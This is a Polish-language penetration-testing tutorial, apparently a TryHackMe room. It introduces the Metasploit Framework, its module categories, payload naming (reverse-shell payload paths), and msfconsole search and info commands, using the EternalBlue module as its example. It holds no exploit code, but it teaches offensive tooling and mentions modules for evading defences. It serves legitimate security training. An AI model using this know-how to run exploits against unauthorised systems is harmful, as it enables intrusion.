---

Wyobraź sobie, że właśnie zostałeś zaangażowany w testowanie penetracyjne dla **Stratford Systems** , średniej wielkości firmy z branży usług finansowych. Twój zespół zakończył fazę rozpoznania. Masz listę adresów IP, otwartych portów i kilka usług, które wyglądają obiecująco. Zauważyłeś nawet coś, co wydaje się być przestarzałe. MŚP implementacji na jednym z ich serwerów. Luka jest tam, udokumentowana w publicznym komunikacie CVE liczba i wszystko.

Co teraz?

Można napisać własny exploit od podstaw, ale wymaga to czasu, specjalistycznych umiejętności i starannego testowania, aby uniknąć awarii celu. W rzeczywistym starciu czas ucieka, a klient oczekuje rezultatów. Potrzebny jest framework: ustrukturyzowany zestaw narzędzi, który porządkuje tysiące znanych exploitów, łączy je z odpowiednimi ładunkami i zapewnia spójny interfejs do konfigurowania, uruchamiania i zarządzania atakami w całej sieci.

Te ramy są**Metasploit**.

## Co to jest Metasploit Struktura?

Ten **Metasploit Framework** to najszerzej używany framework open source do eksploracji w branży testów penetracyjnych. Pierwotnie stworzony przez HD Moore w 2003 roku jako przenośne narzędzie sieciowe. Metasploit został przejęty przez Rapid7 w 2009 r. i rozrósł się do ekosystemu zawierającego łącznie ponad 2600 exploitów i ponad 6100 modułów.

Jedna analogia dla zrozumienia Metasploit byłby dobrze zorganizowanym warsztatem. Nie zbudowałbyś domu jednym młotkiem; potrzebujesz pił, wiertarek, poziomic, taśm mierniczych i elementów złącznych, wszystko zorganizowane, aby znaleźć odpowiednie narzędzie do każdego zadania. Metasploit Działa w ten sam sposób. Zamiast zmuszać Cię do poszukiwania pojedynczych skryptów exploitów rozproszonych po internecie, oferuje scentralizowaną bibliotekę exploitów, skanerów, ładunków i narzędzi poeksploatacyjnych, dostępnych za pośrednictwem jednego interfejsu wiersza poleceń o nazwie `msfconsole`.

Z technicznego punktu widzenia Metasploit obsługuje pełny cykl testów penetracyjnych:

- **Gromadzenie informacji** : skanowanie celów i usługi pobierania odcisków palców
- **Identyfikacja luk w zabezpieczeniach** : wykrywanie znanych wad w systemach docelowych
- **Wykorzystanie** : dostarczanie kodu exploita w celu wykorzystania tych luk
- **Po eksploatacji** : utrzymanie dostępu, gromadzenie danych i przełączanie się na inne systemy
- **Raportowanie** : Rejestrowanie ustaleń na potrzeby dokumentacji i produktów dostarczanych klientom

Chociaż podstawową grupą odbiorców Metasploit są testerzy penetracyjni, to badacze bezpieczeństwa i twórcy exploitów również wykorzystują tę platformę do badań nad lukami w zabezpieczeniach i opracowywania dowodów koncepcji.

## Dwie wersje: Pro vs. Framework

Metasploit jest dostępny w dwóch głównych edycjach:

- **Metasploit Pro** : Wersja komercyjna, utrzymywana przez Rapid7. Zawiera graficzny interfejs użytkownika (GUI), zautomatyzowane przepływy pracy, funkcje współpracy zespołowej oraz funkcje raportowania. Jest to licencjonowane oprogramowanie przeznaczone dla profesjonalnych zespołów ds. bezpieczeństwa.
- **Metasploit Framework** : Wersja open-source, rozwijana przez społeczność. Działa w całości z poziomu wiersza poleceń. Jest to wersja zainstalowana w systemach Kali Linux, Parrot OS i TryHackMe AttackBox i to właśnie jej będziemy używać w tym module.

Każda technika, której nauczysz się w Metasploit Framework, przekłada się bezpośrednio na Metasploit Pro. Podstawowe moduły, polecenia i koncepcje są identyczne; wersja Pro po prostu dodaje warstwę GUI i automatyzacji.

## Trzy filary Ram

Platforma Metasploit opiera się na trzech podstawowych komponentach. Zrozumienie funkcji każdego z nich pomoże Ci efektywnie poruszać się po narzędziu podczas wykonywania pozostałych zadań.

**1. Konsola Msf**

`msfconsole`jest podstawowym interfejsem wiersza poleceń dlaMetasploitFramework. To tutaj spędzisz większość swojego czasu. Z poziomu `msfconsole`Framework możesz wyszukiwać moduły, konfigurować parametry, uruchamiać exploity i zarządzać sesjami na zainfekowanych systemach. Potraktuj go jak kokpit frameworka; dostęp do wszystkiego innego jest możliwy za jego pośrednictwem.

**2. Moduły**

Moduły to podstawowe elementy Metasploit. Każdy moduł to samodzielny fragment kodu zaprojektowany do wykonywania określonego zadania. Istnieje siedem kategorii modułów (exploity, pomocnicze, ładunki, post-exploitation, enkodery, NOP-y i mechanizmy omijania zabezpieczeń), a omówimy każdą z nich w kolejnym zadaniu. Na razie najważniejsze jest to, że siła Metasploit tkwi w bibliotece tysięcy modułów, a nie w jednym narzędziu.

**3. Narzędzia**

Platforma Beyond `msfconsole`i jej moduły zawierają zestaw samodzielnych narzędzi wiersza poleceń. Najważniejszym z nich jest `msfvenom`, który generuje ładunki poza , `msfconsole`do wykorzystania w scenariuszach, w których potrzebny jest samodzielny plik (plik wykonywalny, powłoka internetowa lub surowy kod powłoki). Omówimy je `msfvenom`szczegółowo w czwartej sali tego modułu. Inne narzędzia, takie jak `pattern_create`i , `pattern_offset`są wykorzystywane w tworzeniu exploitów, co wykracza poza zakres tej ścieżki edukacyjnej.

## Co obejmuje ten moduł

Oto pierwszy z czterech pokoi w module Metasploit:

1. **Metasploit: podstawy** (ta sala) — nawigacja po strukturze, zrozumienie modułów, konfigurowanie i uruchamianie exploitów, zarządzanie sesjami
2. [**Metasploit: skanowanie i eksploatacja**](https://tryhackme.com/room/metasploitscanningandexploitation) — skanowanie celów, korzystanie z bazy danych Metasploit, identyfikowanie luk w zabezpieczeniach i eksploatacja działających systemów
3. [**Metasploit: Post-Exploitation**](https://tryhackme.com/room/metasploitpostexploitation) — wykorzystanie Meterpretera do gromadzenia danych uwierzytelniających, eskalacji uprawnień i eksploracji celów
4. [**Metasploit: Generowanie ładunków**](https://tryhackme.com/room/metasploitpayloadgeneration) — generowanie niestandardowych ładunków, zrozumienie kodowania i dostarczanie ładunków do celów

Po ukończeniu nauki we wszystkich czterech pokojach będziesz dysponować umiejętnościami pozwalającymi na przeprowadzenie ataku od momentu jego odkrycia, przez eksploatację, aż po działania następcze, korzystając z Metasploit Framework.

Zaczynajmy.

## Wymagania wstępne

Zanim zaczniesz korzystać z tego pokoju, powinieneś czuć się komfortowo z:

- Podstawowa nawigacja wiersza poleceń systemu Linux ( `cd`, `ls`, `cat`, `pwd`)
- Podstawowe koncepcje sieciowe (adresy IP, porty, komunikacja klient-serwer)
- Ogólne zrozumienie tego, czym jest luka w zabezpieczeniach (wada w oprogramowaniu, którą można wykorzystać)

## Cele edukacyjne

Pod koniec tego pokoju będziesz w stanie:

- Wyjaśnij, czym jest Metasploit Framework i zidentyfikuj jego główne komponenty
- Przejdź `msfconsole`do wyszukiwania, wybierania i sprawdzania modułów
- Skonfiguruj parametry modułu i uruchom exploit na celu
- Zarządzaj aktywnymi sesjami w zagrożonych systemach

Zidentyfikowałeś podatną na ataki usługę działającą na jednym z serwerów internetowych Stratford Systems. Wyniki skanowania pokazują nieaktualną wersję usługi. Apaczze znaną wadą umożliwiającą zdalne wykonanie kodu. Masz CVE numer, masz docelowy adres IP i masz Metasploit Otworzy się przed tobą. Ale zanim zaczniesz szukać modułów, musisz zrozumieć trzy podstawowe koncepcje, wokół których zbudowano cały framework:  **luki w zabezpieczeniach** , **exploity** i **ładunki** .

Te trzy terminy pojawią się w każdym pokoju tego modułu, w każdym raporcie z interakcji, który napiszesz, i praktycznie w każdej rozmowie o bezpieczeństwie. Zdefiniujmy je precyzyjnie.

## Łańcuch exploitów: luka w zabezpieczeniach, exploit, ładunek

Rozważmy analogię z bezpieczeństwem fizycznym. Luka **w zabezpieczeniach** to zepsuty zamek w drzwiach magazynu. **Eksploatacja** to próba otwarcia tych drzwi. **Ładunek** to to, co intruz robi po wejściu do środka: czy to kradnie zapasy, podrzuca urządzenie podsłuchowe, czy po prostu robi zdjęcie, aby udowodnić, że włamanie było możliwe.

Mówiąc językiem technicznym:

- **Luka** : Wada projektu, kodu lub konfiguracji w systemie docelowym. Sama wada nie powoduje szkody, lecz stwarza okazję _do_ jej wyrządzenia. Luka może umożliwić atakującemu wykonanie dowolnego kodu, odczytanie plików, do których nie powinien mieć dostępu, lub całkowite ominięcie uwierzytelniania.
- **Exploit** : Fragment kodu wykorzystujący określoną lukę w zabezpieczeniach. Exploit to mechanizm ataku. Celuje w lukę i uruchamia ją w kontrolowany sposób.
- **Ładunek** : Kod uruchamiany w systemie docelowym _po_ udanym ataku. Exploit otwiera drzwi, a ładunek to to, co przez nie przechodzi. Ładunek może otworzyć powłokę odwrotną, umożliwiającą atakującemu dostęp, utworzyć nowe konto użytkownika lub wykonać polecenie w systemie docelowym.

Ten trzyczęściowy łańcuch jest fundamentalny. Exploit bez ładunku może wywołać lukę w zabezpieczeniach, ale nie przyniesie atakującemu żadnych korzyści. Ładunek bez exploita nie ma możliwości dotarcia do celu. Metasploit Architektura opiera się na łączeniu odpowiednich exploitów z odpowiednim ładunkiem dla danej luki w zabezpieczeniach.

## Siedem kategorii modułów

Metasploitorganizuje całą swoją bibliotekę w siedem kategorii modułów. Każda kategoria pełni odrębną rolę w procesie testów penetracyjnych.

**Wykorzystywanie**

Moduły exploitów atakują konkretną lukę w zabezpieczeniach na konkretnej platformie. Są one uporządkowane według docelowego systemu operacyjnego i usługi (np. `exploits/windows/smb/`, `exploits/linux/http/`). Z ponad 2600 modułami exploitów w obecnym frameworku, jest to największa kategoria. Kiedy słyszysz, jak ktoś mówi: „Użyłem modułu Metasploit”, prawie zawsze ma na myśli exploit.

**Pomocniczy**

Moduły pomocnicze zajmują się wszystkim, co _nie_ jest bezpośrednią eksploatacją. Należą do nich skanery portów, czytniki odcisków palców usług, moduły siłowego logowania, fuzzery i sniffery sieciowe. Jeśli potrzebujesz zebrać informacje o celu lub przetestować dane uwierzytelniające bez dostarczania exploita, potrzebujesz modułu pomocniczego. Wykorzystamy kilka z nich w następnym pomieszczeniu podczas skanowania sieci Stratford Systems.

**Ładunki**

Moduły ładunku zawierają kod, który jest wykonywany na celu po udanym ataku. Metasploit dostarcza prawie 1700 modułów ładunku, obejmujących szeroki zakres systemów operacyjnych, architektur i metod połączenia. Za chwilę przyjrzymy się różnym _typom ładunku (pojedynczym, etapowym i etapowym)._

**Po eksploatacji**

Moduły post-exploitation uruchamiają się _po_ uzyskaniu dostępu do celu poprzez aktywną sesję. Automatyzują one typowe zadania poeksploatacyjne: zrzucanie haseł haseł, enumerację informacji o systemie, wykonywanie zrzutów ekranu, przełączanie się na inne segmenty sieci i wiele innych. Moduły te są uporządkowane według docelowego systemu operacyjnego (np. `post/windows/gather/`, `post/linux/manage/`). Będziemy z nich intensywnie korzystać w sali post-exploitation.

**Kodery**

Moduły kodera przekształcają dane ładunku do innego formatu. Najbardziej znanym koderem jest `x86/shikata_ga_nai`, który stosuje polimorficzne kodowanie XOR. Ważne wyjaśnienie: kodowanie to _nie_ szyfrowanie i samo w sobie _nie_ jest niezawodną techniką omijania zabezpieczeń antywirusowych. Nowoczesne rozwiązania do wykrywania punktów końcowych wykraczają daleko poza proste dopasowywanie sygnatur. Kodery nadal mają uzasadnione zastosowania (na przykład usuwanie nieprawidłowych znaków z kodu powłoki), ale traktowanie ich jako mechanizmu ukrytego jest częstym błędem wśród początkujących. Omówimy to szczerze w sali poświęconej generowaniu ładunku.

**NOP-y**

**Moduły NOP** (No Operation) generują sanki NOP, czyli sekwencje instrukcji, które nic nie robią. W procesorach x86 klasyczną instrukcją NOP jest `0x90`, która nakazuje procesorowi przejście do następnej instrukcji.NOPSanie służą jako wypełnienie, aby zapewnić, że ładunki trafią na przewidywalne adresy pamięci podczas eksploatacji przepełnienia bufora. Rzadko będziesz wchodzić w interakcję zNOPmoduły bezpośrednio; Metasploit obsługujeNOPautomatyczne generowanie sań w razie potrzeby.

**Uchylanie się**

Moduły obejścia to celowo zaprojektowane próby obejścia określonych zabezpieczeń, takich jak Windows Defender czy AppLocker. W przeciwieństwie do koderów (które po prostu ponownie kodują dane), moduły obejścia implementują rzeczywiste techniki obejścia, takie jak „herpaderping” procesów czy nadużycia binarne związane z „życiem poza zasięgiem”. Jest to najmniejsza kategoria modułów, obejmująca obecnie około tuzina modułów. Ich skuteczność jest zróżnicowana i w dużej mierze zależy od konfiguracji zabezpieczeń środowiska docelowego.

## Typy ładunków: pojedyncze, etapowe i stopniowe

W kategorii ładunków Metasploit wyróżnia trzy typy. To krótkie wprowadzenie koncepcyjne; w sali poświęconej generowaniu ładunków szczegółowo omówimy ładunki etapowe i bezetapowe.

**Pojedyncze pakiety** (nazywane również ładunkami **wbudowanymi** ) są autonomiczne. Cały ładunek jest dostarczany w jednym pakiecie. Pojedynczy ładunek może dodać konto użytkownika, wykonać polecenie systemowe lub otworzyć powłokę bind. Ponieważ wszystko znajduje się w jednym pakiecie, pojedyncze pakiety są zazwyczaj większe, ale bardziej niezawodne; nie ma drugiego pobrania, które mogłoby się nie powieść lub zostać zablokowane.

**Stagery** to niewielkie, lekkie ładunki, których jedynym zadaniem jest nawiązanie komunikacji między atakującym a celem. Po nawiązaniu połączenia stager pobiera drugi komponent.

**Etapy** to większe komponenty ładunku pobierane przez stager. Razem stager i jego stage tworzą **etapowy ładunek** . Zaletą jest mniejszy rozmiar początkowy; wadą jest to, że połączenie musi pozostać stabilne wystarczająco długo, aby stage mógł zostać pobrany.

## Czytanie konwencji nazewnictwa

Metasploit używa ścieżki ładunku, aby określić, czy jest on etapowany, czy pojedynczy. Kluczem jest separator między typem powłoki a metodą połączenia:

- `windows/x64/shell_reverse_tcp`— Podkreślenie ( `_`) między `shell`a `reverse`oznacza, że ​​jest to **pojedynczy** (bezetapowy) ładunek. Wszystko znajduje się w jednym pakiecie.
- `windows/x64/shell/reverse_tcp`— Ukośnik ( `/`) między `shell`a `reverse`oznacza, że ​​jest to **etapowany** ładunek. Mały stager łączy się najpierw, a następnie pobiera pełny etap powłoki.

Ten schemat nazewnictwa jest spójny w całym systemie. Po jego rozpoznaniu można błyskawicznie zidentyfikować typ dowolnego ładunku.

Ogólna struktura ścieżki ładunku jest następująca:

`<platform>/<architecture>/<payload_type><separator><connection_method>`

Rozważmy inny przykład: `linux/x86/meterpreter/reverse_tcp`jest to etap Meterpreter ładunek dla 32-bitówLinuxSystemy. Znak `/`pomiędzy `meterpreter`i `reverse_tcp`potwierdza etapowe dostarczenie. Jego odpowiednikiem dla pojedynczego ładunku byłby `linux/x86/meterpreter_reverse_tcp`znak , z podkreśleniem.

Każde narzędzie ma swoją krzywą uczenia się. Dobra wiadomość jest taka, że ​​to `msfconsole`narzędzie zostało zaprojektowane tak, aby pomóc Ci znaleźć to, czego potrzebujesz, bez konieczności zapamiętywania tysięcy nazw modułów. Posiada wbudowane wyszukiwanie, uzupełnianie klawiszem Tab, pomoc kontekstową, a nawet obsługuje standardowe polecenia systemu Linux. W tym zadaniu uruchomimy konsolę i nauczymy się, jak wyszukiwać i sprawdzać moduły. W następnym zadaniu je skonfigurujemy i uruchomimy.

Uruchom Metasploit. Możesz użyć TryHackMe AttackBox lub własnej instalacji Kali Linux, aby śledzić proces.

## Uruchamianie Msfconsole

Otwórz terminal i wpisz `msfconsole`. Po krótkim ładowaniu zobaczysz losowo wybrany baner ASCII, a następnie wersję frameworka i liczbę modułów:

Terminal AttackBox

```shell-session
root@10.130.119.85~# msfconsole

Metasploit tip: Use the 'favorite' command to mark
frequently used modules

 =[ metasploit v6.4.x                          ]
+ -- --=[ 2607 exploits - 1325 auxiliary - 435 post       ]
+ -- --=[ 1710 payloads - 49 encoders - 14 nops          ]
+ -- --=[ 12 evasion                                      ]

msf6 >
```

Baner wyświetla losową grafikę ASCII przy każdym uruchomieniu (ma ona charakter czysto kosmetyczny), a następnie wersję frameworka i liczbę modułów w każdej kategorii. Dokładna liczba modułów będzie się różnić w zależności od daty ostatniej aktualizacji frameworka.

Możemy zauważyć, że standardowy monit terminala zmienił się na `msf6 >`. To oznacza, że ​​jesteśmy teraz w konsoli Metasploit. Każde polecenie wpisane od tego momentu jest interpretowane przez `msfconsole`, a nie przez standardową powłokę.

> **Uwaga** : `msf6`Prefiks odnosi się do głównej wersji frameworka. Starsze instalacje mogą wyświetlać `msf5`. Polecenia i koncepcje omawiane w tym pokoju dotyczą obu wersji.

## Uruchamianie poleceń systemu Linux w konsoli Msfconsole

Jedną z wygodnych cech `msfconsole`jest to, że obsługuje większość standardowychLinuxpolecenia. Nie musisz wychodzić z konsoli, aby sprawdzić adres IP, odczytać plik lub wyświetlić zawartość katalogu:

Terminal AttackBox

```shell-session
msf6 > whoami
[*] exec: whoami

root
msf6 > ip -br a show ens5
[*] exec: ip -br a show ens5

ens5             UP             10.130.119.85/18 metric 100 fe80::3:35ff:fed5:91ed/64
```

Widzimy, że `msfconsole`przekazuje te polecenia do powłoki bazowej w celu wykonania. Jest to przydatne podczas ataku, gdy trzeba szybko potwierdzić adres IP ataku ( `LHOST`) bez opuszczania konsoli.

Nie obsługuje jednak `msfconsole`wszystkich funkcji powłoki. Na przykład przekierowanie wyjścia nie działa:

Terminal AttackBox

```shell-session
msf6 > help > output.txt
[-] No such command
msf6 >
```

Jeśli musisz przekierować dane wyjściowe do pliku, musisz użyć `spool`polecenia (które rejestruje wszystkie dane wyjściowe konsoli w pliku) lub wyjść `msfconsole`i pracować w zwykłym terminalu.

### Uzyskiwanie pomocy

Polecenie `help`wyświetla pełną listę dostępnych `msfconsole`poleceń. Można go również użyć z konkretną nazwą polecenia, aby sprawdzić, jak dane polecenie zostało użyte:

Terminal AttackBox

```shell-session
msf6 > help search
Usage: search [<options>] [<keywords>:<values>]

Prepend a value with '-' to exclude any matching results.
If no options or keywords are provided, cached results are shown.

OPTIONS:
 -h, --help                      Help banner
 -o, --output <filename>         Send output to a file in csv format
 -r, --sort-reverse <column>     Reverse sort results by the specified column
 -s, --sort-column <column>      Sort results by the specified column
 -S, --filter <filter>           Regex filter
 -u, --use                       Use module if a single result is found

Keywords:
 aka         :  Modules with a matching AKA (also-known-as) name
 author      :  Modules written by this author
 arch        :  Modules affecting this architecture
 check       :  Modules that support the 'check' method
 CVE         :  Modules with a matching CVE ID
 edb         :  Modules with a matching Exploit-DB ID
 fullname    :  Modules with a matching full name
 name        :  Modules with a matching descriptive name
 platform    :  Modules affecting this platform
 ref         :  Modules with a matching ref
 target      :  Modules with a matching target
 type        :  Modules of a specific type (exploit, auxiliary, post, payload, nop, encoder, evasion)

Examples:
 search cve:2009 type:exploit
 search cve:2024 platform:windows type:exploit
 search name:smb type:auxiliary

msf6 >
```

To jest wzorzec, z którego będziesz korzystać stale: gdy nie jesteś pewien składni lub opcji polecenia, `help <command>`program podaje odpowiedź bez opuszczania konsoli.

## Historia i uzupełnianie kart

`msfconsole`Przechowuje historię każdego polecenia wpisanego podczas sesji. Użyj tego `history`polecenia, aby wyświetlić ostatnio wprowadzone dane:

Terminal AttackBox

```shell-session
msf6 > history
1  search type:exploit platform:windows smb
2  use exploit/windows/smb/ms17_010_eternalblue
3  show options
4  set RHOSTS MAHCHINE_IP
5  run
6  back
7  search type:auxiliary ssh
msf6 >
```

Można również używać klawiszy strzałek **w górę** i **w dół** do przewijania poprzednich poleceń, tak jak w standardowym terminalu Linux.

**Uzupełnianie za pomocą klawisza Tab** to jedna z `msfconsole`najprzydatniejszych funkcji programu. Działa ono w przypadku poleceń, ścieżek modułów i nazw opcji. Rozważmy poniższy przykład: jeśli wpiszesz tekst `use exploit/windows/smb/ms17`i naciśniesz **klawisz Tab** , konsola automatycznie uzupełni ścieżkę lub wyświetli wszystkie pasujące opcje. To znacznie oszczędza czas wpisywania, szczególnie podczas nawigacji po ścieżkach głęboko zagnieżdżonych modułów.

## Wyszukiwanie modułów

Z ponad 6100 modułami w ramach platformy, znalezienie odpowiedniego modułu jest kluczową umiejętnością. Polecenie `search`to sposób, w jaki to robisz.

**Podstawowe wyszukiwanie**

W najprostszej formie `search`po słowie kluczowym następuje słowo kluczowe. Metasploit zwróci każdy moduł, którego nazwa, opis lub referencje pasują do tego słowa kluczowego:

Terminal AttackBox

```shell-session
msf6 > search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload[...]
```

Przeanalizujmy kolumny w tym wyniku:

- **#** : Indeks numeryczny. Możesz używać tego numeru z poleceniami takimi jak `use`„or” `info`(np. „ `use 0`or `info 0`”) zamiast wpisywać pełną ścieżkę dostępu do modułu.
- **Nazwa** : Pełna ścieżka dostępu do modułu, która zawiera informacje o jego typie ( `exploit/`, `auxiliary/`), platformie docelowej ( `windows/`), kategorii usługi ( `smb/`) i konkretnej nazwie modułu.
- **Data ujawnienia** : Data publicznego ujawnienia luki w zabezpieczeniach. Pole puste w przypadku modułów pomocniczych, które nie są ukierunkowane na konkretny CVE.
- **Ranga** : Ocena niezawodności modułu. Omówimy to za chwilę.
- **Sprawdź** : czy moduł obsługuje nieniszczącą kontrolę podatności ( `Yes`), czy można to zweryfikować wyłącznie poprzez uruchomienie pełnej wersji exploita ( `No`).
- **Opis** : Krótkie podsumowanie działań modułu.

**Wyszukiwanie filtrowane**

Aby uzyskać precyzyjnie ukierunkowane wyszukiwanie, połącz słowa kluczowe z filtrami. Najbardziej przydatne filtry w codziennej pracy to:

- `type`: Filtruj według kategorii modułu ( `exploit`, `auxiliary`, `post`, `payload`, `encoder`, `nop`, `evasion`)
- `platform`: Filtruj według docelowego systemu operacyjnego ( `windows`, `linux`, `osx`, `android`itd.)
- `cve`: Szukaj wedługCVEidentyfikator
- `name`:Dopasuj tylko do opisowej nazwy modułu

Rozważ poniższy przykład. Szukasz dodatkowych modułów skanera związanych z SMB:

Terminal AttackBox

```shell-session
msf6 > search type:auxiliary name:smb

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank    Check  Description
   -   ----                                                        ---------------  ----    -----  -----------
   0   auxiliary/server/capture/smb                                .                normal  No     Authentication Capture: SMB
   1   auxiliary/server/relay/esc8                                 .                normal  No     ESC8 Relay: SMB to HTTP(S)
   2   auxiliary/admin/smb/ms17_010_command                        2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3     \_ AKA: ETERNALSYNERGY                                    .                .       .      .
   4     \_ AKA: ETERNALROMANCE                                    .                .       .      .
   5     \_ AKA: ETERNALCHAMPION                                   .                .       .      .
   6     \_ AKA: ETERNALBLUE                                       .                .       .      .
   7   auxiliary/scanner/smb/smb_ms17_010                          .                normal  No     MS17-010 SMB RCE Detection
   8     \_ AKA: DOUBLEPULSAR                                      .                .       .      .
   9     \_ AKA: ETERNALBLUE                                       .                .       .      .
[...]

msf6 >
```

Możesz również wykluczyć wyniki, poprzedzając wartość filtru znakiem minus. Na przykład, `search type:exploit -platform:windows`zwróci wszystkie exploity, które _nie_ dotyczą systemu Windows.

### Zrozumienie rankingów exploitów

Kolumna **„Ranking”** w wynikach wyszukiwania informuje o przewidywanej niezawodności exploita. Metasploit korzysta z siedmiostopniowego systemu rankingowego:

|Stopień|Oznaczający|
|---|---|
|**Doskonały**|Ten exploit nigdy nie spowoduje awarii usługi. Zazwyczaj luki w zabezpieczeniach typu SQL injection, wykonywanie poleceń lub dołączanie plików są z natury bezpieczne do wykorzystania.|
|**Świetnie**|Exploit ma domyślny cel, który automatycznie wykrywa prawidłową konfigurację (np. adres zwrotny), co sprawia, że ​​jest niezawodny w przypadku typowych konfiguracji.|
|**Dobry**|Exploit ma domyślny cel obejmujący najczęstsze przypadki, ale nie wykrywa go automatycznie.|
|**Normalna**|Exploit działa niezawodnie na konkretnej wersji celu, ale nie wykrywa go automatycznie ani nie ma powszechnie stosowanej domyślnej wartości.|
|**Przeciętny**|Ten rodzaj exploita jest generalnie zawodny, ale jego skuteczność wynosi ponad 50%.|
|**Niski**|Wykorzystanie tej metody jest skuteczne w mniej niż 50% przypadków.|
|**Podręcznik**|Exploit ten zasadniczo polega na odmowie usługi lub wymaga znacznej ręcznej konfiguracji. Wskaźnik powodzenia wynosi 15% lub mniej.|

Wyższa ranga nie gwarantuje sukcesu, a niższa nie gwarantuje porażki. Czynniki środowiskowe, takie jak konfiguracja docelowa, warunki sieciowe i zabezpieczenia, odgrywają rolę. Potraktuj rangę jako punkt wyjścia, a nie gwarancję.

## Inspekcja modułu za pomocą informacji

Po znalezieniu obiecującego modułu `info`polecenie wyświetli szczegółowe informacje na jego temat. Możesz z niego skorzystać `info`na dwa sposoby:

1. Bezpośrednio z poziomu `msf6 >`wiersza poleceń ze ścieżką modułu:`info exploit/windows/smb/ms17_010_eternalblue`
2. Korzystając z indeksu numerycznego z wyników wyszukiwania:`info 0`

Terminal AttackBox

```shell-session
msf6 > info exploit/windows/smb/ms17_010_eternalblue

 Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
 Module: exploit/windows/smb/ms17_010_eternalblue
 Platform: Windows
 Arch:
 Privileged: Yes
 License: Metasploit Framework License (BSD)
 Rank: Average
 Disclosed: 2017-03-14

Provided by:
 Equation Group
 Shadow Brokers
 sleepya
 thelightcosine

Available targets:
 Id  Name
 --  ----
 =>  0   Automatic Target

Check supported:
 Yes

Basic options:
 Name           Current Setting  Required  Description
 ----           ---------------  --------  -----------
 RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
 RPORT          445              yes       The target port (TCP)
 SMBDomain                       no        (Optional) The Windows domain to use for authentication
 SMBPass                         no        (Optional) The password for the specified username
 SMBUser                         no        (Optional) The username to authenticate as
 VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
 VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Description:
 This module is a port of the Equation Group ETERNALBLUE exploit,
 part of the FuzzBunch toolkit released by Shadow Brokers. [...]

References:
 https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
 https://nvd.nist.gov/vuln/detail/CVE-2017-0144
 [...]

Also known as:
 ETERNALBLUE

msf6 >
```

Dane `info`wyjściowe zawierają wszystkie informacje potrzebne do podjęcia decyzji, czy ten moduł jest odpowiedni dla Twojej sytuacji: platformę docelową, wymagane opcje, poziom niezawodności, opis działania exploita oraz odniesienia do luk w zabezpieczeniach (CVE). To nie jest menu pomocy, a jedynie techniczny opis modułu.

Zwróć uwagę na kilka kluczowych pól:

- **Uprzywilejowany** : Jeśli `Yes`, udany exploit zapewni Ci podwyższone uprawnienia (SYSTEM/root) na celu. Jeśli `No`, otrzymasz uprawnienia do eksploatowanej usługi.
- **Sprawdź obsługiwane** : Jeśli `Yes`, możesz zweryfikować, czy cel jest podatny na ataki _bez_ wysyłania danych exploita. Jest to bezpieczniejsze w środowiskach produkcyjnych, gdzie awaria usługi jest niedopuszczalna.
- **Dostępne cele** : Niektóre moduły obsługują wiele konfiguracji docelowych. Domyślna konfiguracja jest zazwyczaj wystarczająca, ale w niektórych przypadkach może być konieczne wybranie konkretnego celu (np. konkretnego dodatku Service Pack systemu Windows lub wersji aplikacji).

## Krótka uwaga na temat EternalBlue

W tym pokoju znajdziesz przykład exploita EternalBlue ( `exploit/windows/smb/ms17_010_eternalblue`), do którego odwołuje się wiele osób, jako przykład edukacyjny. Oto krótka historia: Exploity **EternalBlue**CVE-2017-0144, krytyczna luka w zabezpieczeniach protokołu SMBv1 (Server Message Block) firmy Microsoft, polegająca na przepełnieniu bufora. Luka ta została pierwotnie opracowana przez amerykańską Agencję Bezpieczeństwa Narodowego (NSA) i ujawniona publicznie przez grupę Shadow Brokers w kwietniu 2017 roku. Miesiąc później, w wyniku kampanii ransomware WannaCry, EternalBlue rozprzestrzenił się na setki tysięcy systemów na całym świecie.

Używamy go jako przykładu, ponieważ jest dobrze udokumentowany, niezawodny w środowiskach laboratoryjnych i jasno ilustruje cały proces exploitowania. W rzeczywistym przypadku nie ograniczylibyśmy się do jednego exploita z 2017 roku.

Wyszukałeś moduł, odczytałeś jego  `info`dane wyjściowe i zdecydowałeś, że pasuje do Twojego celu. Teraz musisz wskazać Metasploit , _dokąd_ ma celować, _jak_ nawiązać z Tobą połączenie i _co_ ma dostarczyć. To zadanie obejmuje cały proces od konfiguracji do wykonania: wybór modułu, ustawienie jego parametrów i uruchomienie go na celu.

## Poznaj swój monit

Zanim przejdziemy do poleceń konfiguracyjnych, ustalmy punkt odniesienia, do którego będziesz wielokrotnie wracać. Podczas pracy z Metasploit napotkasz pięć różnych komunikatów. Każdy z nich informuje o _aktualnym_ stanie systemu i _dostępnych poleceniach_ :

|Podpowiedź|Kontekst|Co możesz zrobić|
|---|---|---|
|`root@CONNECTION_IP~#`|Zwykły terminal Linux|Tylko standardowe polecenia systemu Linux.Metasploitnie działa.|
|`msf6 >`|Msfconsole, nie wybrano żadnego modułu|Globalne polecenia Metasploit: `search`, `use`, `sessions`, `setg`. Nie można `exploit`tutaj uruchamiać ani ustawiać opcji specyficznych dla modułu.|
|`msf6 exploit(windows/smb/ms17_010_eternalblue) >`|Kontekst modułu|Pełne polecenia modułu: `set`, `show options`, `exploit`, `run`, `check`, `back`. W wierszu poleceń wyświetla się informacja o tym, który moduł jest załadowany.|
